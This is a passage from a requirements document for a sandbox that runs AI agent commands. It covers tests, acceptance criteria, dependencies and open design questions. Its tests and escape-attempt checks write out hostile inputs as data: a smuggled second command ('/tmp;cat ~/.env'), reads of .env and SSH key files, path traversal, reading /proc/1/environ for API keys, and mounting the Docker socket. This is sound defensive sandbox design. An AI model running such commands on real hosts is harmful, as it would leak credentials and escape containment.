- `test_validate_mount_blocks_env_file` — `validate_mount(".env")` raises `SandboxMountError`.
- `test_validate_mount_blocks_key_file` — `validate_mount("~/.ssh/id_rsa")` raises `SandboxMountError`.
- `test_validate_mount_blocks_traversal` — `validate_mount("../../.env")` raises `SandboxMountError` after path resolution.
- `test_validate_mount_blocks_symlink_to_secret` — create a symlink to `.env`; `validate_mount(symlink_path)` raises `SandboxMountError`.
- `test_validate_mount_allows_safe_path` — `validate_mount("/tmp/test_dir")` succeeds.
- `test_restricted_blocks_metacharacters` — `RestrictedSubprocessRuntime().run(["ls", "/tmp;cat ~/.env"], ...)` raises `SandboxBlockedCommandError`.
- `test_restricted_blocks_credential_path` — `run(["cat", "~/.env"], ...)` raises `SandboxBlockedCommandError`.
- `test_restricted_blocks_unknown_command` — `run(["curl_evil", "http://..."], ...)` raises `SandboxBlockedCommandError`.
- `test_restricted_allows_safe_command` — `run(["ls", "/tmp"], ...)` returns exit code 0.
- `test_sandbox_config_defaults` — `SandboxConfig()` has expected default values.
- `test_env_isolation` — `SandboxConfig.env` defaults to empty dict; `os.environ` not present.

### Integration tests (marked `@pytest.mark.integration`, skipped in CI unless Docker available)

- `test_docker_backend_runs_hello_world` — Docker backend runs `echo hello`, returns exit code 0 and stdout `hello\n`.
- `test_docker_backend_timeout_enforced` — Docker backend with `timeout=2` and `sleep 10` returns exit code 124.
- `test_docker_backend_no_host_env` — Docker backend run of `env` output does not contain `HOME` (host value) or any `*API_KEY*` substring.
- `test_docker_backend_mount_readonly` — write attempt to a `:ro` mounted path fails with non-zero exit code.
- `test_docker_backend_no_network` — `--no-network` run of `curl https://example.com` returns non-zero exit code.
- `test_docker_backend_resource_limits` — container attempting to allocate 4 GB RAM is OOM-killed before the 60-second timeout.
- `test_docker_backend_container_removed_after_run` — after a successful run, no container with TAG's label is listed in `docker ps -a`.
- `test_docker_backend_container_removed_after_timeout` — after a timeout kill, container is removed.
- `test_e2b_backend_runs_command` (requires `E2B_API_KEY`) — E2B backend runs `echo hello`, returns exit code 0.
- `test_modal_backend_runs_command` (requires Modal credentials) — Modal backend runs a Python function, returns exit code 0.

### Escape attempt tests (integration, requires Docker)

- `test_no_escape_via_proc_filesystem` — run `cat /proc/1/environ` inside container; output must not contain any of `OPENAI_API_KEY`, `MODAL_TOKEN_ID`, `E2B_API_KEY`, `HERMES_API_KEY`.
- `test_no_escape_via_docker_socket_mount` — attempt to mount `/var/run/docker.sock` fails with `SandboxMountError`.
- `test_no_escape_via_privileged_flag` — the Docker backend never sets `privileged=True`; assert this in a unit test by mocking `docker.models.containers.ContainerCollection.run` and inspecting kwargs.

---

## 12. Acceptance Criteria

**AC-001** `tag sandbox run -- echo hello` completes in < 10 seconds (from cold Docker image) and prints `hello`.

**AC-002** `tag sandbox run --runtime docker --env TEST=1 -- env` output does not contain any key from `os.environ` other than `PATH`, `HOME`, and `TEST`.

**AC-003** `tag sandbox run -- cat ~/.env` (or any `*.env` path) is rejected before a sandbox is started; exit code is 1; error message contains `credential pattern`.

**AC-004** `tag sandbox run --runtime restricted -- cat ~/.ssh/id_rsa` is rejected; exit code is 1.

**AC-005** `tag sandbox run --runtime docker --timeout 2 -- sleep 10` exits with code 124 within 5 seconds of invocation.

**AC-006** After `tag sandbox run --runtime docker` completes (success or failure), `docker ps -a --filter label=tag.sandbox` shows no containers created by this invocation.

**AC-007** A queue job with `"sandbox": true` in its config dict produces a result file whose first line contains `[sandbox: ` with a non-empty runtime name.

**AC-008** `tag sandbox runtimes` produces a table with at least four rows (docker, e2b, modal, restricted) and exits with code 0.

**AC-009** `tag sandbox list` after running a sandbox shows the sandbox ID, runtime, and status; `tag sandbox logs <id>` shows the captured output.

**AC-010** `tag sandbox kill <id>` terminates a running Docker container within 5 seconds and writes a `killed=true` entry to the audit log.

**AC-011** Every sandbox invocation appends a JSON line to `~/.tag/runtime/sandbox-audit.jsonl`. The `env_keys` field lists injected env key names but no values.

**AC-012** `python -c "import tag.sandbox"` succeeds on a system where `docker`, `e2b`, and `modal` are not installed; no `ImportError` is raised.

**AC-013** `tag sandbox run --runtime docker --mount /var/run/docker.sock:/var/run/docker.sock -- ls` is rejected with a `SandboxMountError` referencing the Docker socket path.

**AC-014** Running `tag sandbox run --runtime auto` on a system without Docker and without E2B/Modal credentials selects the `restricted` backend and logs the selection.

---

## 13. Dependencies

| Dependency | Version | Optional | Extra name | Install trigger |
|---|---|---|---|---|
| `docker` (Python SDK) | `>=7.0.0` | Yes | `docker` | First `--runtime docker` invocation |
| `e2b` | `>=0.17.0` | Yes | `e2b` | First `--runtime e2b` invocation |
| `modal` | `==1.3.4` | Yes (already in `pyproject.toml`) | `modal` | First `--runtime modal` invocation |
| `requests` | `==2.33.0` | No (already core) | — | Runtime probe uses `requests` for Docker API health check fallback |

All three optional packages are lazy-installed via `tools/lazy_deps.py` on first use, following the established pattern for `anthropic`, `exa`, `firecrawl`, etc. They are explicitly excluded from `[all]` to contain supply-chain blast radius (per the policy comment in `pyproject.toml` added 2026-05-12).

`pyproject.toml` additions:

```toml
docker = ["docker==7.1.0"]
e2b = ["e2b==0.17.2"]
# modal already present at modal = ["modal==1.3.4"]
sandbox = ["docker==7.1.0", "e2b==0.17.2", "modal==1.3.4"]  # all backends
```

---

## 14. Open Questions

**OQ-001 Default runtime selection policy**
Should `--runtime auto` prefer Docker (local, fast, no API key required) over E2B (stronger isolation, requires API key)? Current proposal: Docker first. Alternative: make the default configurable per profile via `execution.sandbox_default_runtime`. Decision needed before implementation.

**OQ-002 Network policy for Docker sandboxes**
Should sandboxed containers have internet access by default? The current proposal allows egress on the bridge network unless `--no-network` is passed, because many agent tasks require downloading packages. A stricter default (`--no-network` on) would break most Python agent workflows unless users explicitly opt in. This is a security-usability tradeoff. Recommendation: default to bridge (internet access) but document it prominently; add a profile-level `execution.sandbox_no_network: true` override.

**OQ-003 Persistent sandbox sessions**
Several agent workflows benefit from a persistent container that accumulates state across multiple commands (e.g., a Docker container where an agent installs packages, runs tests, inspects results, and iterates). The current design destroys the container after each `sandbox run` invocation. A `tag sandbox attach` command that starts a long-lived named container and routes subsequent commands into it via `docker exec` is a natural extension. Deferred to PRD-022.

**OQ-004 Sandbox for interactive TUI sessions**
The `tag shell` (PRD-019) natural language shell mode spawns commands interactively. Sandboxing interactive commands requires a PTY inside the container (`docker run -it`). The current `sandbox.py` design is batch-oriented (run command, collect output, return). Integration with PTY-based interactive sessions is deferred.

**OQ-005 Windows support**
The Docker backend requires Docker Desktop on Windows and the `docker` SDK, which works via the named pipe `//./pipe/docker_engine`. The restricted subprocess backend's `resource.setrlimit` is Unix-only; a Windows fallback via `win32api.SetProcessWorkingSetSize` is theoretically available but untested. Windows support is scoped as best-effort in v1, with Docker Desktop the recommended path.

**OQ-006 Audit log forwarding**
Enterprises will want sandbox audit logs forwarded to Splunk, Datadog, or a SIEM. A `TAG_SANDBOX_AUDIT_SYSLOG=true` env var that additionally writes each audit record to `syslog` is a low-effort addition. Deferred to a follow-on minor.

**OQ-007 Should `SAFE_COMMANDS` be user-configurable?**
The restricted backend's allowlist is currently a hardcoded module constant overridable via env var. A profile-level `execution.sandbox_safe_commands: [...]` list would allow per-agent customization. Deferred; users with custom command requirements should use Docker instead.

---

## 15. Complexity & Timeline

**Complexity:** L (Large)

**Estimated duration:** 2 sprints (approximately 4 weeks with one engineer)

| Sprint | Deliverable |
|--------|-------------|
| Sprint 1, Week 1 | `sandbox.py` core: `SandboxConfig`, `SandboxResult`, `SandboxRuntime` ABC, `validate_mount()`, `BLOCKED_PATTERNS`, `RestrictedSubprocessRuntime` (all logic, all unit tests passing) |
| Sprint 1, Week 2 | `DockerSandboxRuntime` (run, stream, timeout, cleanup, resource limits, security options); `tag sandbox run --runtime docker` CLI plumbing; `tag sandbox runtimes`; audit logging |
| Sprint 2, Week 1 | `E2BSandboxRuntime`; `ModalSandboxRuntime`; `tag sandbox list`, `logs`, `kill`; `--runtime auto` detection; queue_worker integration (FR-013) |
| Sprint 2, Week 2 | Integration tests for all three runtimes; escape attempt tests; documentation; `TAG_SANDBOX_ALLOWED_IMAGES` allowlist; INDEX.md update; review and hardening pass |

**Risk factors:**
- Docker SDK API surface is stable but container streaming is slightly different across Docker Engine versions; test on Docker 24, 25, 26, and 27.
- E2B SDK is actively developed; pin an exact version and test against it.
- Modal's dynamic function definition pattern (creating a `modal.App` per invocation) may have cold-start latency; measure and document.
- The restricted subprocess backend's metacharacter regex is a best-effort control, not a security boundary; the documentation and error messages must be clear about this limitation to avoid false security confidence.
